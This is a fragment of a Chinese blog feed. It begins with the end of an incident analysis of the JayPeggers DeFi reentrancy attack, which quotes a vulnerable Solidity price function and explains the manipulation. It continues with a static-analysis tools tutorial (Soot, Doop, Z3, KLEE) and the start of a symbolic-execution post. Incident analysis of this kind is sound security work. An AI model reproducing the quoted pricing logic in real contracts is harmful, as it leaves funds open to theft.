重入的。</p><p><img src="http://cdn.blog-blockchain.xyz/202212292323928.png" alt="image-20221229232347867"></p><p>在 <code>sell</code> 函数中，计算 eth 的逻辑如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function JAYtoETH(uint256 value) public view returns (uint256) &#123;</span><br><span class="line">    return (value * address(this).balance).div(totalSupply());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时 <code>address(this).balance</code> 已经因为传入了 50.5 WETH 而增大了，但是<code>buyJay</code> 中的 <code>_mint</code> 函数中的 <code>_totalSupply</code> 还没变化，因此造成了价格操控。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;UTU 2022 年 12 月 29 日 5 时（北京时间 13 时），以太坊主网上的 &lt;a href=&quot;https://twitter.com/jaypeggerz&quot;&gt;JayPeggers&lt;/a&gt; 协议遭到重入攻击，损失约 15 ETH。随后攻击者通过 &lt;a href=&quot;https://etherscan.io/address/0xd90e2f925da726b50c4ed8d0fb90ad053324f31b&quot;&gt;Tornado.Cash&lt;/a&gt; 和 &lt;a href=&quot;https://etherscan.io/address/0xff1f2b4adb9df6fc8eafecdcbf96a2b351680455&quot;&gt;Aztec&lt;/a&gt; 转移被盗资金</summary>
        
      
    
    
    
    <category term="defi" scheme="https://www.blog-blockchain.xyz/categories/defi/"/>
    
    
    <category term="defi" scheme="https://www.blog-blockchain.xyz/tags/defi/"/>
    
  </entry>
  
  <entry>
    <title>（九）体验静态分析工具</title>
    <link href="https://www.blog-blockchain.xyz/pl/static-analysis-tools/"/>
    <id>https://www.blog-blockchain.xyz/pl/static-analysis-tools/</id>
    <published>2022-12-23T03:16:30.000Z</published>
    <updated>2024-11-18T09:49:18.488Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/pl/understanding-program-analysis/" title="（一）初识软件分析">（一）初识软件分析</a></li><li><a href="/pl/data-flow-analysis/" title="（二）数据流分析基础">（二）数据流分析基础</a></li><li><a href="/pl/LP-souffle/" title="（三）Datalog和程序分析">（三）Datalog和程序分析</a></li><li><a href="/pl/ssa-and-sparse-analysis/" title="（四）静态单赋值和稀疏分析">（四）静态单赋值和稀疏分析</a></li><li><a href="/pl/Interprocedural-DFA/" title="（五）过程间分析">（五）过程间分析</a></li><li><a href="/pl/points-to-analysis/" title="（六）指向分析">（六）指向分析</a></li><li><a href="/pl/abstract-interpretation/" title="（七）抽象解释">（七）抽象解释</a></li><li><a href="/pl/SMT-and-symbolic-excution/" title="（八）SMT和符号执行">（八）SMT和符号执行</a></li><li><a href="/pl/static-analysis-tools/" title="（九）体验静态分析工具">（九）体验静态分析工具</a></li><li><a href="/pl/fuzzing-introduction/" title="（十）Fuzzing 基础">（十）Fuzzing 基础</a></li></ol></blockquote><p>这篇文章主要是体验各种程序分析的工具，对于网上已经写的很好的文章，采取了直接引用的方式。读者应该多了解引用的链接，感兴趣的话可以跟着其他人的文章做一做。</p><p>如果需要精通使用，程序分析框架的学习成本还是比较高的。但是强烈建议有时间的读者，可以玩一玩。</p><h1>Java</h1><p>java 基本语法与 C++ 类似，不熟悉的读者可以参考教程学习：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744">https://www.liaoxuefeng.com/wiki/1252599548343744</a> ，如果有编程基础，入门很快的。</p><h1>Soot</h1><p>以下引用内容来自 <a href="https://www.cnblogs.com/xine/">星雪亭</a>的《<a href="https://www.cnblogs.com/xine/p/14511818.html">Soot 使用笔记</a>》，我对里面不太准确的内容进行了调整和改正。</p><blockquote><h2 id="1、soot-简介">1、soot 简介</h2><p>Soot 是 McGill 大学的 Sable 研究小组自 1996 年开始开发的 Java 字节码分析工具，它提供了多种字节码分析和变换功能，通过它可以进行过程内和过程间的分析优化，以及程序流图的生成，还能通过图形化的方式输出，让用户对程序有个直观的了解。尤其是做单元测试的时候，可以很方便的通过这个生成控制流图然后进行测试用例的覆盖，显著提高效率。</p><p>soot 项目在 github 上的地址为：<a href="https://github.com/Sable/soot">https://github.com/Sable/soot</a></p><p><strong>soot 是 java 优化框架，提供 4 种中间代码来分析和转换字节码。</strong></p><ul><li>Baf：精简的字节码表示，操作简单</li><li>Jimple：适用于优化的 3-address 中间表示</li><li>Shimple：Jimple 的 SSA 变体</li><li>Grimple：适用于反编译和代码检查的 Jimple 汇总版本。</li></ul><p><strong>soot 提供的输入和输出格式</strong></p><p><strong>输入格式</strong></p><ul><li>java</li><li>android 字节码</li><li>Jasmin，低级中间表示</li><li>soot 提供的分析功能</li><li>class(Java8 以后)</li></ul><p><strong>输出格式</strong></p><ul><li>Java 字节码</li><li>android 字节码</li><li>Jimple</li><li>Jasmin</li><li>shimple</li><li>baf</li><li>grimple</li><li>xml</li><li>class</li><li>dava</li><li>template</li><li>jar 文件</li></ul><p><strong>soot 提供的分析功能</strong></p><ul><li>调用图构造</li><li>指针分析</li><li>Def/use chains</li><li>模块驱动的程序内数据流分析</li><li>结合 FlowDroid 的污染分析</li></ul><h2 id="2-soot-的安装">2.soot 的安装</h2><p>目前来说，要使用 soot 有三种途径，分别是命令行、程序内以及 Eclipse 插件（不推荐）</p><h3 id="2-1、命令行">2.1、命令行</h3><p>可以在<a href="https://soot-build.cs.uni-paderborn.de/public/origin/master/soot/soot-master/">这里</a>下载最新的 soot jar 包，我下载的是 4.1.0 版本中的 sootclasses-trunk-jar-with-dependencies.jar 包，这个包应该自带了 soot 所需要的所有依赖。下载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://soot-build.cs.uni-paderborn.de/public/origin/master/soot/soot-master/4.1.0/build/sootclasses-trunk-jar-with-dependencies.jar</span><br></pre></td></tr></table></figure><p>输入以下命令：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-cp sootclasses-trunk-<span class="keyword">jar-with-dependencies.jar </span>soot.Main</span><br></pre></td></tr></table></figure><p>可以看到：</p><p><a href="https://img2020.cnblogs.com/blog/2111975/202103/2111975-20210310151005773-1785486172.png"><img src="http://cdn.blog-blockchain.xyz/202211131855206.png" alt="image-20210310150138324"></a></p><p>再输入</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-cp sootclasses-trunk-<span class="keyword">jar-with-dependencies.jar </span>soot.Main -h</span><br></pre></td></tr></table></figure><p>可以看到有关 soot 的各种帮助信息。</p><h3 id="2-2、程序内使用-soot">2.2、程序内使用 soot</h3><p>从 github 上 soot 项目的简介可知，soot 一般配合 maven 来进行部署,相关的依赖添加语句如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ca.mcgill.sable<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为目前我的目的只是简单的使用 soot，所以对于程序中 soot 的使用在后面学习了相关 api 再来更新。</p><h2 id="3-命令行中-soot-的使用">3.命令行中 soot 的使用</h2><p>我的目标是将 java 转化为 Jimple 以发现程序编译中的问题和规律。因此本文的重点就在这里，我先在 soot.jar 所在的文件夹下新建了一个 java 文件 HelloWorld.java 如下图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HelloWorld.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我使用的 Java 版本是 JDK1.8，根据 soot 提示，默认输入是 class 文件，所以我先用 javac 命令将 HelloWorld.java 编译为 HelloWorld.class。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">javac </span>HelloWorld.<span class="keyword">java</span></span><br></pre></td></tr></table></figure><p>下面我们尝试将上面得到的 class 文件作为输入传给 soot.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> sootclasses-trunk-jar-with-dependencies.jar soot.Main -pp -<span class="built_in">cp</span> .  HelloWorld</span><br></pre></td></tr></table></figure><p>得到的结果没有报错，但是也无事发生，这是因为 soot 需要通过-f 属性指定输出的类型，这里我们将输出类型指定为 Jimple，查询文档之后得知要添加-f J 以确定输出格式，最终的语句如下：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-cp sootclasses-trunk-<span class="keyword">jar-with-dependencies.jar </span>soot.Main -f <span class="keyword">J </span>-pp -cp .  HelloWorld</span><br></pre></td></tr></table></figure><p>该命令在 jar 文件所在目录下生成了一个 sootOutput 文件夹，里面有一个 HelloWorld.jimple 文件，使用 Idea 编辑器打开这个文件，得到的内容如下，这就是一个最基本的 HelloWorld.java 文件所形成的 jimple 码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> <span class="keyword">extends</span> <span class="title class_">java</span>.lang.Object</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> &lt;init&gt;()</span><br><span class="line">    &#123;</span><br><span class="line">        HelloWorld r0;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@this</span>;</span><br><span class="line"></span><br><span class="line">        specialinvoke r0.&lt;init&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        java.io.PrintStream $r0;</span><br><span class="line">        java.lang.String[] r1;</span><br><span class="line"></span><br><span class="line">        r1 := <span class="meta">@parameter0</span>;</span><br><span class="line"></span><br><span class="line">        $r0 = java.lang.System.out;</span><br><span class="line"></span><br><span class="line">        $r0.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-soot-命令行相关参数设置">3.soot 命令行相关参数设置</h2><p><a href="https://soot-build.cs.uni-paderborn.de/public/origin/develop/soot/soot-develop/options/soot_options.htm">soot/wiki</a>里的命令表格写的十分清楚和明确，这里我就直接搬运过来，方便以后查阅。</p><h1>二、Soot 生成控制流图</h1><p>如果是将 Soot 当作简单工具来分析的人，可以直接使用 Soot 自带的工具 soot.tools.CFGViewer 分析类中的每个方法的控制流并生成 DOT 语言描述的控制流图，然后用 graphviz 中的 dot 命令来转换成可视化图形格式如.PNG</p><h2 id="1、使用-soot-tools-CFGViewer-来生成-Triangle-class-的控制流图">1、使用 soot.tools.CFGViewer 来生成 Triangle.class 的控制流图</h2><p>新建文件 <code>Test.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">5.0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">cal</span><span class="params">(<span class="type">int</span> num, String type)</span>&#123;</span><br><span class="line">        <span class="type">double</span> temp=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(type == <span class="string">&quot;sum&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= num; i++)&#123;</span><br><span class="line">                temp =temp + i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type == <span class="string">&quot;average&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= num; i++)&#123;</span><br><span class="line">                temp = temp + i;</span><br><span class="line">            &#125;</span><br><span class="line">            temp = temp / (num -<span class="number">1</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Please enter the right type(sum or average)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译和运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Test.java &amp;&amp; java -cp sootclasses-trunk-jar-with-dependencies.jar soot.tools.CFGViewer -pp -cp . Test</span><br></pre></td></tr></table></figure><p>生成了 Test.dot 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dot -Tpng -o Test.png sootOutput/Test\ double\ cal\(int,java.lang.String\).dot</span><br></pre></td></tr></table></figure><p>生成了 png 文件。</p><p><a href="https://img2020.cnblogs.com/blog/2111975/202103/2111975-20210310151005317-1991410460.png"><img src="http://cdn.blog-blockchain.xyz/202211131855193.png" alt="pic2"></a></p></blockquote><p>关于 Soot 的详细说明，可以看<a href="https://jckling.github.io/">Jckling’s Blog</a> 的《<a href="https://jckling.github.io/2022/02/23/Other/Soot%20%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/">Soot 使用记录</a>》和《<a href="https://www.cnblogs.com/xine/p/14533697.html">利用 Soot 对 APK 插桩实践 </a>》</p><h1>Doop</h1><blockquote><p>学习资源：<a href="http://plast-lab.github.io/feb16-seminar/">http://plast-lab.github.io/feb16-seminar/</a></p><p>项目地址：<a href="https://bitbucket.org/yanniss/doop/src/master/">https://bitbucket.org/yanniss/doop/src/master/</a></p><p>视频讲解：<a href="https://www.bilibili.com/video/BV1yz411B7MS">https://www.bilibili.com/video/BV1yz411B7MS</a></p></blockquote><p>资料和文档都较少，建议多去 Discord 提问。</p><h2 id="介绍">介绍</h2><blockquote><p><a href="https://bitbucket.org/yanniss/doop">Doop</a> is a <strong>declarative</strong> framework for static analysis of Java programs, centered on <strong>pointer analysis</strong> algorithms. Doop provides a large variety of analyses and also the surrounding scaffolding to run an analysis end-to-end (fact generation, processing, statistics, etc.).</p><p>The declarative nature of Doop stems from its use of <strong>Datalog</strong> (more specifically, <em>LogiQL</em>, a Datalog dialect developed by <a href="http://www.logicblox.com/">LogicBlox</a>) to specify an analysis.</p><p>The building blocks of Datalog programs come in the form of <strong>predicates</strong>. Our input facts (a.k.a. EDB logic) are represented as predicate values, e.g., <code>Person(&quot;John&quot;)</code> or <code>Parent(&quot;John&quot;, &quot;Johnny jr&quot;)</code>.</p><p>Then we have <strong>rules</strong> (a.k.a. IDB logic) to infer new information from facts already known to be true. This continues until no new information can be extracted.</p></blockquote><p>如果读者不熟悉以上概念，可以翻之前的 Datalog 的文章，里面不仅有语法介绍，也有一些原理说明。</p><h2 id="安装">安装</h2><p>首先按照项目 README 的建议，自己构建 souffle 而不是直接安装二进制包，记得添加环境变量。</p><blockquote><p>The currently maintained version targets <a href="http://souffle-lang.org/">Soufflé</a>, an open-source Datalog engine for program analysis (which is the default engine used). In order to install an up-to-date version of Soufflé, the best practice is to clone the development Github <a href="https://github.com/souffle-lang/souffle">repo</a> and follow the instructions found on <a href="https://souffle-lang.github.io/build">this page</a>. Doop is currently tested with Souffle versions 1.5.1, 2.0.2, and 2.1.</p></blockquote><h2 id="基本命令">基本命令</h2><p><code>./doop --help all</code> 全部命令如下：</p><p><img src="http://cdn.blog-blockchain.xyz/202211122334447.png" alt="image-20221112233431123"></p><p>读者可以跑一下项目里 <code>docs/doop-101-examples/Example.java </code> 的例子，先把这个打包成 <code>Example.java</code>，然后开始分析，分析的时间非常长，WSL 虚拟机 Ubuntu 跑了 40 分钟，都没有结果。</p><p>之后的内容就不介绍了，建议阅读这篇<a href="https://jckling.github.io/2021/12/17/Security/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%20Doop%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">博客</a>，还有<a href="https://blog.csdn.net/m0_73679848/article/details/126817839?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-126817839-blog-122013427.pc_relevant_3mothn_strategy_recovery&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-126817839-blog-122013427.pc_relevant_3mothn_strategy_recovery&amp;utm_relevant_index=3">这篇</a>，自己跑几个例子。因为真的要弄清楚各种规则，很花时间的。了解最重要的原理即可：</p><p>Doop 执行流程大致可以分为三步：</p><blockquote><ol><li>使用 soot 生成 jimple 文件，使用 <code>--generate-jimple</code> 参数可以输出 jimple 文件，在 output//database/jimple 文件夹下</li><li>将 jimple 文件转换为 datalog 引擎的输入事实（.facts）</li><li>使用 souffle 引擎执行选定的分析，将关系输出为 .csv，即分析结果</li></ol><p>Doop 分析字节码（或 Android 的 Dex 代码），两者都被转换为名为 Jimple 的中间表示（Intermediate Representation, IR），实际分析的就是 jimple；因为字节码是基于堆栈的，但指针分析中需要变量/局部变量来分析指向，所以使用 Soot 将基于堆栈的字节码转换为具有局部变量的中间表示。下一步将 Jimple 中间表示转换为 .facts 文件（数据库表），然后由 Datalog 逻辑加载这些文件作为输入。Datalog 从输入开始推导事实，填充关系；一些关系使用 <code>.output</code> 标记输出，保存为 .csv 文件；当 Datalog 执行终止时，保存的 .csv 文件就是分析输出。</p><p><a href="https://s2.loli.net/2021/12/17/NP1SnQWBdwMAzJu.jpg"><img src="http://cdn.blog-blockchain.xyz/202211131240693.jpeg" alt="img"></a></p><p>来自：<a href="https://jckling.github.io/2021/12/17/Security/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%20Doop%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">博客</a></p></blockquote><h1>Z3</h1><blockquote><ul><li>安装教程和 GitHub：<a href="https://github.com/Z3Prover/z3">https://github.com/Z3Prover/z3</a></li><li>非常棒的 wiki：<a href="https://github.com/Z3Prover/z3/wiki">https://github.com/Z3Prover/z3/wiki</a></li><li>教程：<a href="https://github.com/Z3Prover/z3/tree/master/examples/python/tutorial/jupyter">https://github.com/Z3Prover/z3/tree/master/examples/python/tutorial/jupyter</a></li><li><a href="https://z3prover.github.io/api/html/namespacez3py.html">Python API</a> (also available in <a href="https://z3prover.github.io/api/html/z3.html">pydoc format</a>)</li><li>python binding 教程：<a href="https://github.com/philzook58/z3_tutorial/blob/master/Z3%20Tutorial.ipynb">https://github.com/philzook58/z3_tutorial/blob/master/Z3 Tutorial.ipynb</a></li></ul></blockquote><p>由于时间限制，就不详细介绍 API 了，读者有需求或者感兴趣，可以自己读文档。以后有需要我在学习如何应用到实际科研场景。</p><h1>STP</h1><blockquote><p>GitHub：<a href="https://github.com/stp/stp">https://github.com/stp/stp</a></p><p>Doc：<a href="https://stp.readthedocs.io/en/latest/">https://stp.readthedocs.io/en/latest/</a></p></blockquote><p>一个把问题编码成 SAT 的求解器。安装之后遇到坑，请看 Issue，基本能够解决。python binding 的用法直接看 build 里 python 的源码即可，内容很少。</p><h1>Tai-e</h1><blockquote><p>软文介绍：<a href="https://zhuanlan.zhihu.com/p/547780818">https://zhuanlan.zhihu.com/p/547780818</a></p><p>发布说明：<a href="https://zhuanlan.zhihu.com/p/488957195">https://zhuanlan.zhihu.com/p/488957195</a></p><p>论文：<a href="https://arxiv.org/abs/2208.00337">https://arxiv.org/abs/2208.00337</a></p><p>代码实现：<a href="https://github.com/pascal-lab/Tai-e">https://github.com/pascal-lab/Tai-e</a></p></blockquote><p>首先可以看设计者的演讲视频【<a href="https://www.bilibili.com/video/BV1gP4y1d7Jt/?share_source=copy_web&amp;vd_source=a539892bc04ba3c567a4eb2db82e002c">静态程序分析框架“太阿”的设计之道_李樾老师</a>】，下面是通用性的程序分析框架的架构图，个人觉得参考意义很大。我们接下来会尝试去完成课程的作业。</p><img src="http://cdn.blog-blockchain.xyz/202212081532081.png" alt="image-20221208153247730" style="zoom: 67%;" /><blockquote><p>后续有时间会基于它，完成一些作业。</p></blockquote><h1>KLEE</h1><p>C 语言的符号执行工具。</p><blockquote><p>GitHub：<a href="https://github.com/klee/klee/tree/master">https://github.com/klee/klee/tree/master</a></p><p>主页和教程：<a href="http://klee.github.io/getting-started/">http://klee.github.io/getting-started/</a></p></blockquote><p>建议<a href="http://klee.github.io/build-llvm11/">手动编译安装</a>，多踩踩坑，熟悉工具链，这样才能熟悉基本流程。安装完之后按照官方的教程跑一跑就可以了。利用好主页的资源，邮件列表里别人的讨论和问题很实用。</p><h1>总结</h1><p>最近看静态分析的工具，基本流程都是生成中间表示(IR)，简化源码或者操作码，中间还可能有静态单赋值或者 def-use 的优化。然后就分成两种方式了。</p><p>一种是直接是一些软件分析的算法，写死了，事先提供的。这样的算法会提供控制流、指针分析这些信息。另外一种是基于 Datalog，首先用 C++或者 python 等语言生成 facts，这些 facts 是程序的各种信息。然后再根据预定的 Datalog 逻辑还有选项，生成这个程序需要的 Datalog 代码，然后由 Datalog 引擎编译 Datalog 代码，生成 C++ 代码，然后开始执行各种程序分析算法。</p><p>前者的方式就像 slither 的 detector 规则，一般简单的情况就够用了，拓展性不好。后者的方式，是往往基于前者提取的信息，比如 slither 就只完成了第一步。后者可以具备可拓展性，可以自己添加额外的 datalog 代码，自定义一些分析。为什么用 datalog 呢，因为代码量会小很多，而且自己写 C++ 不一定有引擎生成的高效。</p><p>提高分析精度的方式，我看到有采用多种中间表示（IR）的，不同 IR 有一些侧重点，然后综合起来。</p><p>**读者如果感兴趣，不妨自己学习理论知识，然后折腾玩一玩。**如果遇到困难，不妨在博客下方留言。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/pl/understanding-program-analysis/&quot; title=&quot;（一）初识软件分析&quot;&gt;（一）初识软件分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/data-flow-analysis/&quot; title=&quot;（二）数据流分析基础&quot;&gt;（二）数据流分析基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/LP-souffle/&quot; title=&quot;（三）Datalog和程序分析&quot;&gt;（三）Datalog和程序分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/ssa-and-sparse-analysis/&quot; title=&quot;（四）静态单赋值和稀疏分析&quot;&gt;（四）静态单赋值和稀疏分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/Interprocedural-DFA/&quot; title=&quot;（五）过程间分析&quot;&gt;（五）过程间分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/points-to-analysis/&quot; title=&quot;（六）指向分析&quot;&gt;（六）指向分析&lt;</summary>
        
      
    
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/categories/program-language/"/>
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/tags/program-language/"/>
    
  </entry>
  
  <entry>
    <title>（八）SMT和符号执行</title>
    <link href="https://www.blog-blockchain.xyz/pl/SMT-and-symbolic-excution/"/>
    <id>https://www.blog-blockchain.xyz/pl/SMT-and-symbolic-excution/</id>
    <published>2022-12-23T02:35:30.000Z</published>
    <updated>2024-11-15T14:30:54.926Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/pl/understanding-program-analysis/" title="（一）初识软件分析">（一）初识软件分析</a></li><li><a href="/pl/data-flow-analysis/" title="（二）数据流分析基础">（二）数据流分析基础</a></li><li><a href="/pl/LP-souffle/" title="（三）Datalog和程序分析">（三）Datalog和程序分析</a></li><li><a href="/pl/ssa-and-sparse-analysis/" title="（四）静态单赋值和稀疏分析">（四）静态单赋值和稀疏分析</a></li><li><a href="/pl/Interprocedural-DFA/" title="（五）过程间分析">（五）过程间分析</a></li><li><a href="/pl/points-to-analysis/" title="（六）指向分析">（六）指向分析</a></li><li><a href="/pl/abstract-interpretation/" title="（七）抽象解释">（七）抽象解释</a></li><li><a href="/pl/SMT-and-symbolic-excution/" title="（八）SMT和符号执行">（八）SMT和符号执行</a></li><li><a href="/pl/static-analysis-tools/" title="（九）体验静态分析工具">（九）体验静态分析工具</a></li><li><a href="/pl/fuzzing-introduction/" title="（十）Fuzzing 基础">（十）Fuzzing 基础</a></li></ol></blockquote><h1>前言</h1><p>我们程序分析的学习进入了下一个阶段。在第一篇文章中提到程序分析可以大体分成<strong>抽象和搜索</strong>两部分，之前都是学习了抽象的部分。我们从<strong>数据流分析</strong>开始，讨论了抽象的基本思想，分支（包括循环）如何合并，节点如何更新等知识。从理论层面，探讨了数据流分析的的抽象和转换函数必须满足的条件以及数据流分析的性质，因此我们介绍了格理论。特别地，详细介绍了 widening 和 narrowing 的方法。<strong>在这一部分，我们建立了对于抽象的方法的基本认识</strong>。</p><p>然后，我们学习的 <code>Datalog</code> ，从基本数理逻辑出发介绍了逻辑式编程语言，接着介绍了典型的 Souffle 语言和它在程序分析上的应用。</p><p>在数据流分析中有几种很典型的方法<strong>Def-use</strong> 和 <strong>SSA</strong>，Def-use 主要简化了节点更新时关注的值，缩小了范围。进一步学习了静态单赋值(SSA)的方法，<strong>每个变量只赋值一次</strong>。但是分支会造成变量赋值不一致的情况，所以加入和交汇函数。为了优化交汇函数，确定什么时候需要在某个基本块引入交汇函数，我们又学习了「支配」「支配边界」的概念以解决这个问题。最后，讨论了无法完全转换成 SSA 时，可以采用部分 SSA 的方法。</p><p>具备了单个程序的过程内分析的基础后，我们开始学习过程间分析的基本原理，将过程间分析转换成<strong>过程内分析的衔接</strong>。特别的，我们以函数调用作为例子，考虑了全局变量和过程间分析导致的精度损失的问题。为了避免函数调用时错误的节点更新操作，我们学习了<strong>基于克隆的上下文敏感性分析</strong>，并且特别讨论了递归函数如何处理以及不同的上下文类型的处理方式。我们将程序分析转换成图的形式，引入了<strong>括号匹配的 CFL-reachability 的精确上下文敏感分析</strong>。最后，简要学习了加快过程间分析速度的两种方式<strong>函数摘要</strong>和<strong>动态规划</strong>，额外介绍了函数嵌套情况下的合并方式。</p><p>指针分析是非常重要的一块内容，我们首先学习了程序分析中的各种敏感性，包括流敏感（flow-sensitive）、路径敏感（path-sensitive）、上下文敏感（context-sensitive）、域敏感（field-sensitive），为后面的进一步学习打下基础。接着学习了<strong>流非敏感的指向分析</strong>和<strong>流敏感指向分析</strong>，他们对于指针操作的转换函数不同，但是思路是基本一致的。指针分析中有两个很重要的算法，<strong>Anderson 算法</strong>和 <strong>Steensgaard 算法</strong>，希望读者可以掌握它们的思路和规则。基于 <strong><code>get-put</code> 的 CFL-reachability 